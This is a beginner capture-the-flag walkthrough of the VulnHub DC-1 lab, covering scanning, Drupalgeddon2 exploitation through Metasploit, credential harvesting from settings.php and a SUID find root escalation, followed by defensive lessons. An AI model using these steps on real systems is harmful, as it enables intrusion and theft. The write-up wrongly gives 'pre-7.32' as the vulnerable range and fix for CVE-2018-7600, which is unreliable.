# DC-1

**Platform:** VulnHub | **Difficulty:** Beginner | **Date:** Nov. 2026

> Author: DCAU — [VulnHub page](https://www.vulnhub.com/entry/dc-1,292/)

## 1. Reconnaissance

Identify the target on the local network, then enumerate open ports and services.

```bash
nmap -sn 10.0.2.0/24
nmap -sC -sV -p- 10.0.2.4
```

- `-sC` runs Nmap's default scripts (banner grabbing, page titles, etc.)
- `-sV` tries to fingerprint the exact service version
- `-p-` scans all 65535 ports instead of just the top 1000

**Observed:**

```
[TODO] paste your nmap output
```

Typically three ports are open: **22** (SSH), **80** (HTTP/Apache), **111** (RPC/portmapper).

## 2. Enumeration

Port 80 serves a website running **Drupal**.

An outdated Drupal 7 install (pre-7.32) is a strong signal: it's vulnerable to **Drupalgeddon2 (CVE-2018-7600)**, a pre-authentication remote code execution flaw in the Form API.

## 3. Exploitation

Drupalgeddon2 lets an unauthenticated attacker inject and execute PHP code through a crafted request to Drupal's form rendering engine, because user-supplied render array keys were not properly sanitized before being passed to PHP's `call_user_func_array`. Metasploit automates the whole chain.

```bash
msfconsole -q
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 10.0.2.4
set RPORT 80
run
```

This drops a shell as `www-data`. Stabilize it for a proper interactive session:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Flags collected along the way:**

```bash
www-data@DC-1:/var/www$ cat flag1.txt
www-data@DC-1:/var/www$ cat sites/default/settings.php
```

`flag1.txt` points to the Drupal config file, which holds the MySQL database credentials used by the CMS.

```
[TODO] flag1 content
[TODO] DB credentials found
```

Logging into the database with those credentials and browsing the `users` table confirms the admin account, whose password hash can be overwritten using Drupal's own hashing script (`scripts/password-hash.sh`) to log in via the web UI and grab `flag3` from the dashboard.

```
[TODO] flag3 content
```

## 4. Privilege Escalation

Look for SUID binaries, which run with the privileges of their owner rather than the invoking user:

```bash
find / -perm -4000 2>/dev/null
```

`/usr/bin/find` shows up with the SUID bit set — abnormal, and directly exploitable since `find` can execute arbitrary commands via `-exec`:

```bash
find . -exec /bin/sh -p \; -quit
```

`-p` keeps the shell privileged (prevents bash from dropping the inherited root privileges), `-quit` stops `find` right after the first execution.


```bash
cat /root/thefinalflag.txt
```

```
[TODO] final flag content
```

## 5. Lessons Learned

- An outdated CMS is an easy, pre-packaged entry point — Drupalgeddon2 had public Metasploit modules within days of disclosure, so patching cadence matters as much as the fix itself.
- Config files like `settings.php` are a goldmine for an attacker; database credentials should never be reachable from a compromised web user without further hardening (e.g. separate DB accounts with least privilege).
- SUID should never be set on general-purpose binaries (`find`, `vim`, `less`, `cp`, ...). These are the first things an attacker checks — see [GTFOBins](https://gtfobins.github.io/) for the full list of abusable binaries.
- **Fix:** update Drupal core past 7.32 (or to a maintained major version), remove the SUID bit from `find` (`chmod u-s /usr/bin/find`), and restrict DB user privileges to what the application actually needs.
